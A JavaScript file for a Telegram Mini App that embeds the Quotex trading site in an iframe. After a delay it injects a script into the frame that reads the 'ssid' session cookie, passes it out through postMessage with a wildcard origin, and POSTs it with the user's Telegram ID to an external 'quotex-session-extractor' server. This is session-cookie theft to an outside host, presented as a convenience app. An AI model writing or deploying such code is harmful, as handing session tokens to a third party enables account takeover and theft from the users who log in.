document.addEventListener("DOMContentLoaded", async () => {
    const telegram = window.Telegram.WebApp;
    telegram.expand(); // Expand the Mini App to full screen

    // Wait for user to log in, then extract ssid
    setTimeout(() => {
        try {
            // Inject script into the iframe
            const iframe = document.getElementById("quotex-frame");
            const iframeWindow = iframe.contentWindow;
            
            const script = document.createElement("script");
            script.textContent = `
                setTimeout(() => {
                    const cookies = document.cookie;
                    const match = cookies.match(/ssid=([^;]+)/);
                    if (match) {
                        window.parent.postMessage({ ssid: match[1] }, "*");
                    }
                }, 3000);
            `;
            iframeWindow.document.body.appendChild(script);
        } catch (error) {
            console.error("Error injecting script:", error);
        }
    }, 5000);

    // Listen for the extracted ssid
    window.addEventListener("message", (event) => {
        if (event.data.ssid) {
            console.log("Extracted SSID:", event.data.ssid);
            
            // Send to the Telegram bot backend
            fetch("https://quotex-session-extractor-production.up.railway.app:8080/api/store_ssid", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    telegram_id: telegram.initDataUnsafe.user.id,
                    ssid: event.data.ssid
                })
            }).then(response => response.json())
              .then(data => console.log("Server response:", data))
              .catch(err => console.error("Error:", err));
        }
    });
});
